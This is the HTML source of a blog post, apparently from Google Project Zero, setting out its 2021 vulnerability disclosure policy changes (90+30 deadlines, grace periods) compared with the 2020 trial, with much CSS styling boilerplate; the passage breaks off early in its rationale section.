0}ul.lst-kix_w50gxariue8t-1{list-style-type:none}.lst-kix_9568v5o897ln-3&gt;li{counter-increment:lst-ctn-kix_9568v5o897ln-3}ol.lst-kix_9568v5o897ln-6.start{counter-reset:lst-ctn-kix_9568v5o897ln-6 0}.lst-kix_fyc7bvwifwx-4&gt;li{counter-increment:lst-ctn-kix_fyc7bvwifwx-4}ol.lst-kix_xxbp3lkvfgkz-2.start{counter-reset:lst-ctn-kix_xxbp3lkvfgkz-2 0}.lst-kix_hsa2mdcw8ezl-0&gt;li{counter-increment:lst-ctn-kix_hsa2mdcw8ezl-0}ol.lst-kix_fyc7bvwifwx-6.start{counter-reset:lst-ctn-kix_fyc7bvwifwx-6 0}.lst-kix_w50gxariue8t-4&gt;li{counter-increment:lst-ctn-kix_w50gxariue8t-4}.lst-kix_dig7rs8e4m8q-4&gt;li{counter-increment:lst-ctn-kix_dig7rs8e4m8q-4}.lst-kix_wq9tqalf23mu-5&gt;li:before{content:"" counter(lst-ctn-kix_wq9tqalf23mu-5,lower-roman) ". "}.lst-kix_wq9tqalf23mu-6&gt;li:before{content:"" counter(lst-ctn-kix_wq9tqalf23mu-6,decimal) ". "}ol.lst-kix_dig7rs8e4m8q-5.start{counter-reset:lst-ctn-kix_dig7rs8e4m8q-5 0}.lst-kix_9568v5o897ln-1&gt;li:before{content:"" counter(lst-ctn-kix_9568v5o897ln-1,lower-latin) ". "}.lst-kix_n4p12ux2ttpf-4&gt;li:before{content:"" counter(lst-ctn-kix_n4p12ux2ttpf-4,lower-latin) ". "}.lst-kix_wq9tqalf23mu-1&gt;li:before{content:"\0025cb  "}.lst-kix_wq9tqalf23mu-2&gt;li:before{content:"" counter(lst-ctn-kix_wq9tqalf23mu-2,lower-roman) ". "}ol.lst-kix_rmtg91ibosyw-8{list-style-type:none}.lst-kix_wztke9q34ehj-0&gt;li{counter-increment:lst-ctn-kix_wztke9q34ehj-0}ol.lst-kix_rmtg91ibosyw-7{list-style-type:none}ol.lst-kix_rmtg91ibosyw-6{list-style-type:none}.lst-kix_n4p12ux2ttpf-7&gt;li:before{content:"" counter(lst-ctn-kix_n4p12ux2ttpf-7,lower-latin) ". "}.lst-kix_n4p12ux2ttpf-8&gt;li:before{content:"" counter(lst-ctn-kix_n4p12ux2ttpf-8,lower-roman) ". "}.lst-kix_w50gxariue8t-6&gt;li{counter-increment:lst-ctn-kix_w50gxariue8t-6}ol.lst-kix_7p3d4w3cmyya-6.start{counter-reset:lst-ctn-kix_7p3d4w3cmyya-6 0}ol.lst-kix_xxbp3lkvfgkz-4.start{counter-reset:lst-ctn-kix_xxbp3lkvfgkz-4 0}.lst-kix_9568v5o897ln-6&gt;li:before{content:"" counter(lst-ctn-kix_9568v5o897ln-6,decimal) ". "}.lst-kix_rmtg91ibosyw-4&gt;li{counter-increment:lst-ctn-kix_rmtg91ibosyw-4}.lst-kix_n4p12ux2ttpf-3&gt;li:before{content:"" counter(lst-ctn-kix_n4p12ux2ttpf-3,decimal) ". "}.lst-kix_9568v5o897ln-5&gt;li:before{content:"" counter(lst-ctn-kix_9568v5o897ln-5,lower-roman) ". "}.lst-kix_n4p12ux2ttpf-6&gt;li{counter-increment:lst-ctn-kix_n4p12ux2ttpf-6}.lst-kix_9568v5o897ln-2&gt;li:before{content:"" counter(lst-ctn-kix_9568v5o897ln-2,lower-roman) ". "}.lst-kix_n4p12ux2ttpf-0&gt;li:before{content:"" counter(lst-ctn-kix_n4p12ux2ttpf-0,decimal) ". "}ol.lst-kix_9568v5o897ln-7.start{counter-reset:lst-ctn-kix_9568v5o897ln-7 0}.lst-kix_7p3d4w3cmyya-0&gt;li:before{content:"" counter(lst-ctn-kix_7p3d4w3cmyya-0,decimal) ". "}ol.lst-kix_7p3d4w3cmyya-8{list-style-type:none}.lst-kix_fyc7bvwifwx-4&gt;li:before{content:"" counter(lst-ctn-kix_fyc7bvwifwx-4,lower-latin) ". "}ol.lst-kix_7p3d4w3cmyya-6{list-style-type:none}.lst-kix_7p3d4w3cmyya-0&gt;li{counter-increment:lst-ctn-kix_7p3d4w3cmyya-0}ol.lst-kix_7p3d4w3cmyya-7{list-style-type:none}.lst-kix_fyc7bvwifwx-1&gt;li:before{content:"" counter(lst-ctn-kix_fyc7bvwifwx-1,lower-latin) ". "}.lst-kix_fyc7bvwifwx-5&gt;li:before{content:"" counter(lst-ctn-kix_fyc7bvwifwx-5,lower-roman) ". "}.lst-kix_7p3d4w3cmyya-1&gt;li:before{content:"\0025cb  "}.lst-kix_xxbp3lkvfgkz-5&gt;li{counter-increment:lst-ctn-kix_xxbp3lkvfgkz-5}.lst-kix_7p3d4w3cmyya-4&gt;li:before{content:"" counter(lst-ctn-kix_7p3d4w3cmyya-4,lower-latin) ". "}.lst-kix_9568v5o897ln-8&gt;li{counter-increment:lst-ctn-kix_9568v5o897ln-8}.lst-kix_w50gxariue8t-2&gt;li{counter-increment:lst-ctn-kix_w50gxariue8t-2}.lst-kix_7p3d4w3cmyya-8&gt;li:before{content:"" counter(lst-ctn-kix_7p3d4w3cmyya-8,lower-roman) ". "}.lst-kix_dig7rs8e4m8q-3&gt;li:before{content:"" counter(lst-ctn-kix_dig7rs8e4m8q-3,decimal) ". "}.lst-kix_7p3d4w3cmyya-5&gt;li:before{content:"" counter(lst-ctn-kix_7p3d4w3cmyya-5,lower-roman) ". "}ol.lst-kix_7p3d4w3cmyya-0{list-style-type:none}.lst-kix_fyc7bvwifwx-8&gt;li:before{content:"" counter(lst-ctn-kix_fyc7bvwifwx-8,lower-roman) ". "}ol.lst-kix_7p3d4w3cmyya-4{list-style-type:none}ol.lst-kix_7p3d4w3cmyya-5{list-style-type:none}.lst-kix_dig7rs8e4m8q-2&gt;li:before{content:"" counter(lst-ctn-kix_dig7rs8e4m8q-2,lower-roman) ". "}ol.lst-kix_7p3d4w3cmyya-2{list-style-type:none}ol.lst-kix_7p3d4w3cmyya-3{list-style-type:none}.lst-kix_n4p12ux2ttpf-8&gt;li{counter-increment:lst-ctn-kix_n4p12ux2ttpf-8}ul.lst-kix_hsa2mdcw8ezl-1{list-style-type:none}.lst-kix_dig7rs8e4m8q-7&gt;li:before{content:"" counter(lst-ctn-kix_dig7rs8e4m8q-7,lower-latin) ". "}ul.lst-kix_hsa2mdcw8ezl-2{list-style-type:none}.lst-kix_9568v5o897ln-1&gt;li{counter-increment:lst-ctn-kix_9568v5o897ln-1}ol.lst-kix_rmtg91ibosyw-5{list-style-type:none}ul.lst-kix_hsa2mdcw8ezl-5{list-style-type:none}.lst-kix_rmtg91ibosyw-0&gt;li{counter-increment:lst-ctn-kix_rmtg91ibosyw-0}ol.lst-kix_rmtg91ibosyw-4{list-style-type:none}ul.lst-kix_hsa2mdcw8ezl-6{list-style-type:none}ol.lst-kix_rmtg91ibosyw-3{list-style-type:none}ul.lst-kix_hsa2mdcw8ezl-3{list-style-type:none}ol.lst-kix_rmtg91ibosyw-2{list-style-type:none}ul.lst-kix_hsa2mdcw8ezl-4{list-style-type:none}ol.lst-kix_rmtg91ibosyw-0{list-style-type:none}.lst-kix_dig7rs8e4m8q-6&gt;li:before{content:"" counter(lst-ctn-kix_dig7rs8e4m8q-6,decimal) ". "}ul.lst-kix_hsa2mdcw8ezl-7{list-style-type:none}ul.lst-kix_hsa2mdcw8ezl-8{list-style-type:none}ol.lst-kix_xxbp3lkvfgkz-5.start{counter-reset:lst-ctn-kix_xxbp3lkvfgkz-5 0}.lst-kix_fyc7bvwifwx-0&gt;li:before{content:"" counter(lst-ctn-kix_fyc7bvwifwx-0,decimal) ". "}ol.lst-kix_dig7rs8e4m8q-6.start{counter-reset:lst-ctn-kix_dig7rs8e4m8q-6 0}.lst-kix_wztke9q34ehj-2&gt;li{counter-increment:lst-ctn-kix_wztke9q34ehj-2}.lst-kix_xxbp3lkvfgkz-7&gt;li:before{content:"" counter(lst-ctn-kix_xxbp3lkvfgkz-7,lower-latin) ". "}.lst-kix_w50gxariue8t-6&gt;li:before{content:"" counter(lst-ctn-kix_w50gxariue8t-6,decimal) ". "}.lst-kix_fyc7bvwifwx-1&gt;li{counter-increment:lst-ctn-kix_fyc7bvwifwx-1}ol.lst-kix_7p3d4w3cmyya-2.start{counter-reset:lst-ctn-kix_7p3d4w3cmyya-2 0}.lst-kix_w50gxariue8t-2&gt;li:before{content:"" counter(lst-ctn-kix_w50gxariue8t-2,lower-roman) ". "}.lst-kix_xxbp3lkvfgkz-3&gt;li:before{content:"" counter(lst-ctn-kix_xxbp3lkvfgkz-3,decimal) ". "}ol.lst-kix_rmtg91ibosyw-2.start{counter-reset:lst-ctn-kix_rmtg91ibosyw-2 0}.lst-kix_n4p12ux2ttpf-1&gt;li{counter-increment:lst-ctn-kix_n4p12ux2ttpf-1}ol.lst-kix_xxbp3lkvfgkz-6.start{counter-reset:lst-ctn-kix_xxbp3lkvfgkz-6 0}.lst-kix_k3wfty7femh7-5&gt;li:before{content:"\0025a0  "}ol.lst-kix_rmtg91ibosyw-5.start{counter-reset:lst-ctn-kix_rmtg91ibosyw-5 0}.lst-kix_k3wfty7femh7-1&gt;li:before{content:"\0025cb  "}ol.lst-kix_7p3d4w3cmyya-0.start{counter-reset:lst-ctn-kix_7p3d4w3cmyya-0 2}ol.lst-kix_xxbp3lkvfgkz-8.start{counter-reset:lst-ctn-kix_xxbp3lkvfgkz-8 0}ol.lst-kix_dig7rs8e4m8q-5{list-style-type:none}ol.lst-kix_dig7rs8e4m8q-4{list-style-type:none}ol.lst-kix_dig7rs8e4m8q-3{list-style-type:none}ol.lst-kix_rmtg91ibosyw-4.start{counter-reset:lst-ctn-kix_rmtg91ibosyw-4 0}ol.lst-kix_dig7rs8e4m8q-2{list-style-type:none}.lst-kix_rmtg91ibosyw-2&gt;li{counter-increment:lst-ctn-kix_rmtg91ibosyw-2}ol.lst-kix_dig7rs8e4m8q-8{list-style-type:none}ol.lst-kix_dig7rs8e4m8q-7{list-style-type:none}ol.lst-kix_dig7rs8e4m8q-6{list-style-type:none}.lst-kix_7p3d4w3cmyya-5&gt;li{counter-increment:lst-ctn-kix_7p3d4w3cmyya-5}.lst-kix_wq9tqalf23mu-6&gt;li{counter-increment:lst-ctn-kix_wq9tqalf23mu-6}ol.lst-kix_dig7rs8e4m8q-0{list-style-type:none}.lst-kix_wztke9q34ehj-7&gt;li{counter-increment:lst-ctn-kix_wztke9q34ehj-7}ol.lst-kix_rmtg91ibosyw-3.start{counter-reset:lst-ctn-kix_rmtg91ibosyw-3 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_xxbp3lkvfgkz-7&gt;li{counter-increment:lst-ctn-kix_xxbp3lkvfgkz-7}.lst-kix_9568v5o897ln-6&gt;li{counter-increment:lst-ctn-kix_9568v5o897ln-6}.lst-kix_dig7rs8e4m8q-6&gt;li{counter-increment:lst-ctn-kix_dig7rs8e4m8q-6}ol{margin:0;padding:0}table td,table th{padding:0}.c11{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:285pt;border-top-color:#000000;border-bottom-style:solid}.c20{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:234pt;border-top-color:#000000;border-bottom-style:solid}.c0{background-color:#ffffff;color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Google Sans";font-style:normal}.c12{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c16{padding-top:0pt;padding-bottom:0pt;line-height:1.38;orphans:2;widows:2;text-align:left;height:11pt}.c5{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.c7{margin-left:36pt;padding-top:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c17{margin-left:9pt;padding-top:0pt;text-indent:-9pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c10{-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline;text-decoration-skip-ink:none;font-size:8pt;font-style:italic}.c32{padding-top:0pt;padding-bottom:0pt;line-height:1.38;orphans:2;widows:2;text-align:left}.c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c27{color:#000000;text-decoration:none;vertical-align:baseline;font-size:20pt;font-style:normal}.c2{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c23{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:center}.c30{-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline;text-decoration-skip-ink:none}.c35{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c26{margin-left:82.5pt;border-spacing:0;border-collapse:collapse;margin-right:auto}.c14{border-spacing:0;border-collapse:collapse;margin-right:auto}.c3{background-color:#ffffff;font-family:"Google Sans";font-weight:700}.c28{color:#000000;text-decoration:none;vertical-align:baseline}.c25{margin-left:72pt;padding-left:0pt}.c9{font-weight:700;font-family:"Google Sans"}.c22{font-weight:400;font-family:"Arial"}.c15{margin-left:36pt;padding-left:0pt}.c1{font-weight:400;font-family:"Google Sans"}.c18{color:inherit;text-decoration:inherit}.c8{padding:0;margin:0}.c31{margin-left:36pt;text-indent:-18pt}.c24{font-size:8pt;font-style:italic}.c33{max-width:468pt;padding:72pt 72pt 72pt 72pt}.c21{height:11pt}.c34{font-style:italic}.c6{background-color:#ffffff}.c19{background-color:#e69138}.c29{font-weight:700}.c13{height:0pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c6 c33"&gt; &lt;p class="c4"&gt;&lt;span class="c2 c22"&gt;Posted by Tim Willis, Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;At Project Zero, we spend a lot of time discussing and evaluating vulnerability disclosure policies and their consequences for users, vendors, fellow security researchers, and software security norms of the broader industry. We aim to be a vulnerability research team that benefits everyone, working across the entire ecosystem to help make 0-day hard.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1 c6"&gt;We remain committed to adapting our policies and practices to best achieve our mission, &amp;nbsp;demonstrating this commitment at the beginning of last year with our &lt;/span&gt;&lt;span class="c1 c6 c30"&gt;&lt;a class="c181" href="https://googleprojectzero.blogspot.com/2020/01/policy-and-disclosure-2020-edition.html"&gt;2020 Policy and Disclosure Trial&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. &lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1 c6"&gt;As part of our annual year-end review, we evaluated our policy goals, solicited input from those that receive most of our reports, and a&lt;/span&gt;&lt;span class="c1 c6"&gt;djusted our approach for 2021.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c12" id="h.n27idc934xsy"&gt;&lt;span class="c29"&gt;Summary of changes for 2021&lt;/span&gt;&lt;/h1&gt; &lt;p class="c4 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;Starting today, we&amp;#39;re changing our Disclosure Policy to&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;refocus&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;on reducing the time it takes for vulnerabilities to get fixed, &lt;/span&gt;&lt;span class="c1"&gt;improving the current industry benchmarks on disclosure timeframes&lt;/span&gt;&lt;span class="c2 c1"&gt;, as well as changing when we release technical details.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c3"&gt;The short version&lt;/span&gt;&lt;span class="c1 c6"&gt;: Project Zero won&amp;#39;t share technical details of a vulnerability for 30 days if a vendor patches it before the &lt;/span&gt;&lt;span class="c1 c6"&gt;90-day&lt;/span&gt;&lt;span class="c1 c6"&gt;&amp;nbsp;or 7-day &lt;/span&gt;&lt;span class="c1 c6"&gt;deadline&lt;/span&gt;&lt;span class="c1 c6"&gt;. The 30-day period is intended for user patch adoption.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2 c1"&gt;The full list of changes for 2021:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.ee0b425e315574a5c2b4b9f4f2d6dae2aa7168ac"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c14"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c20 c19" colspan="1" rowspan="1"&gt; &lt;p class="c23"&gt;&lt;span class="c2 c1"&gt;2020 Trial (&amp;quot;Full 90&amp;quot;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c19 c20" colspan="1" rowspan="1"&gt; &lt;p class="c23"&gt;&lt;span class="c2 c1"&gt;2021 Trial (&amp;quot;90+30&amp;quot;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c20" colspan="1" rowspan="1"&gt;&lt;ol class="c8 lst-kix_wq9tqalf23mu-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c7 li-bullet-0"&gt;&lt;span class="c2 c1"&gt;Public disclosure occurs 90 days after an initial vulnerability report, regardless of when the bug is fixed. Technical details (initial report plus any additional work) are published on Day 90. A 14-day grace period* is allowed.&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br&gt;Earlier disclosure with mutual agreement.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/td&gt;&lt;td class="c20" colspan="1" rowspan="1"&gt;&lt;ol class="c8 lst-kix_fyc7bvwifwx-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c7 li-bullet-0"&gt;&lt;span class="c1"&gt;Disclosure deadline of 90 days. If an issue remains unpatched after 90 days, technical details are published immediately. &lt;/span&gt;&lt;span class="c1"&gt;If the issue is fixed within 90 days, technical details are published 30 days after the fix.&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;A 14-day grace period* is allowed.&lt;/span&gt;&lt;span class="c1"&gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br&gt;&lt;/span&gt;&lt;span class="c2 c1"&gt;Earlier disclosure with mutual agreement.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c20" colspan="1" rowspan="1"&gt;&lt;ol class="c8 lst-kix_xxbp3lkvfgkz-0 start" start="2"&gt;&lt;li style="margin-left: 46pt;" class="c7 li-bullet-0"&gt;&lt;span class="c1"&gt;For vulnerabilities that were actively exploited in-the-wild against users, public disclosure occurred 7 days after the initial vulnerability report, regardless of when the bug is fixed. &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;In-the wild vulnerabilities are not offered a grace period&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c1"&gt;&lt;br&gt;&lt;br&gt;&lt;/span&gt;&lt;span class="c1"&gt;Earlier disclosure with mutual agreement.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/td&gt;&lt;td class="c20" colspan="1" rowspan="1"&gt;&lt;ol class="c8 lst-kix_w50gxariue8t-0 start" start="2"&gt;&lt;li style="margin-left: 46pt;" class="c7 li-bullet-0"&gt;&lt;span class="c1"&gt;Disclosure deadline of 7 days for issues that are being actively exploited in-the-wild against users. If an issue remains unpatched after 7 days, technical details are published immediately. If the issue is fixed within 7 days, technical details are published 30 days after the fix.&lt;br&gt;&lt;br&gt;Vendors can request a 3-day grace period* for in-the-wild bugs. &lt;br&gt;&lt;br&gt;&lt;/span&gt;&lt;span class="c1"&gt;Earlier disclosure with mutual agreement.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c20" colspan="1" rowspan="1"&gt;&lt;ol class="c8 lst-kix_dig7rs8e4m8q-0 start" start="3"&gt;&lt;li style="margin-left: 46pt;" class="c7 li-bullet-0"&gt;&lt;span class="c2 c1"&gt;Technical details are immediately published when a vulnerability is patched in the grace period*.&lt;br&gt;&lt;br&gt;(e.g. Patched on Day 100 in grace period, disclosure on Day 100)&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/td&gt;&lt;td class="c20" colspan="1" rowspan="1"&gt;&lt;ol class="c8 lst-kix_7p3d4w3cmyya-0 start" start="3"&gt;&lt;li style="margin-left: 46pt;" class="c7 li-bullet-0"&gt;&lt;span class="c1"&gt;If a grace period* is granted, it uses up a portion of the 30-day patch adoption period.&lt;/span&gt;&lt;span class="c2 c1"&gt;&lt;br&gt;&lt;br&gt;(e.g. Patched on Day 100 in grace period, disclosure on Day 120)&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c16"&gt;&lt;span class="c28 c1 c24"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2 c1"&gt;Elements of the 2020 trial that will carry over to 2021:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.4588c49f689502cbdfa513148295a06500c870c8"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="c26"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c11 c19" colspan="1" rowspan="1"&gt; &lt;p class="c23 c31"&gt;&lt;span class="c2 c1"&gt;2020 Trial + 2021 Trial&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c35"&gt;&lt;span class="c1"&gt;1. &lt;/span&gt;&lt;span class="c1"&gt;Policy goals:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c8 lst-kix_hsa2mdcw8ezl-1 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 c25 li-bullet-0"&gt;&lt;span class="c2 c1"&gt;Faster patch development&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c25 li-bullet-0"&gt;&lt;span class="c2 c1"&gt;Thorough patch development&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c25 li-bullet-0"&gt;&lt;span class="c2 c1"&gt;Improved patch adoption&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c17"&gt;&lt;span class="c2 c1"&gt;2. If Project Zero discovers a variant of a previously reported Project Zero bug, technical details of the variant will be added to the existing Project Zero report (which may be already public) and the report will not receive a new deadline.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c17"&gt;&lt;span class="c2 c1"&gt;3. If a 90-day deadline is missed, technical details are made public on Day 90, unless a grace period* is requested and confirmed prior to deadline expiry.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c17"&gt;&lt;span class="c2 c1"&gt;4. If a 7-day deadline is missed, technical details are made public on Day 7, unless a grace period* is requested and confirmed prior to deadline expiry.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c16"&gt;&lt;span class="c1 c24 c28"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c32"&gt;&lt;span class="c1 c24"&gt;* The grace period is an additional 14 days that a vendor can request if they do not expect that a reported vulnerability will be fixed within 90 days, but do expect it to be fixed within 104 days. Grace periods will not be granted for vulnerabilities that are expected to take longer than 104 days to fix. &amp;nbsp;For vulnerabilities that are being actively exploited and reported under the &lt;/span&gt;&lt;span class="c1 c10"&gt;&lt;a class="c181" href="https://security.googleblog.com/2013/05/disclosure-timeline-for-vulnerabilities.html"&gt;7 day deadline&lt;/a&gt;&lt;/span&gt;&lt;span class="c1 c24"&gt;, the grace period&lt;/span&gt;&lt;span class="c1 c24"&gt;&amp;nbsp;is an additional 3 days&lt;/span&gt;&lt;span class="c1 c24"&gt;&amp;nbsp;that a vendor can request if they do not expect that a reported vulnerability will be fixed within 7 days, but do expect it to be fixed within 10 days.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c12" id="h.9c99o485i78l"&gt;&lt;span class="c5"&gt;Rationale on changes for 2021&lt;/span&gt;&lt;/h1&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;As we discussed in last year&amp;#39;s &amp;quot;&lt;/span&gt;&lt;span class="c30 c1"&gt;&lt;a class="c181" href="https://googleprojectzero.blogspot.com/2020/01/policy-and-disclosure-2020-edition.html"&gt;Policy and Disclosure: 2020 Edition&lt;/a&gt;&lt;/span&gt;&lt;span class="c2 c1"&gt;&amp;quot;, our three vulnerability disclosure policy goals are:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class="c8 lst-kix_9568v5o897ln-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c4 c15 li-bullet-0"&gt;&lt;span class="c9"&gt;Faster patch development:&lt;/span&gt;&lt;span class="c2 c1"&gt;&amp;nbsp;shorten the time between a bug report and a fix being available for users.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c15 li-bullet-0"&gt;&lt;span class="c9"&gt;Thorough patch development&lt;/span&gt;&lt;span class="c1 c2"&gt;: ensure that each fix is correct and comprehensive.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c15 li-bullet-0"&gt;&lt;span class="c9"&gt;Improved patch adoption&lt;/span&gt;&lt;span class="c2 c1"&gt;: shorten the time between a patch being released and users installing it.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2 c1"&gt;Our policy trial for 2020 aimed to balance all three of these goals, while keeping our policy consistent, simple, and fair. Vendors were given 90 days to work on the full cycle of patch development and patch adoption. The idea was if a vendor wanted more time for users to install a patch, they would prioritize shipping the fix earlier in the 90 day cycle rather than later.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;In practice however, we &lt;/span&gt;&lt;span class="c1 c34"&gt;didn&amp;#39;t&lt;/span&gt;&lt;span class="c2 c1"&gt;&amp;nbsp;observe a significant shift in patch development 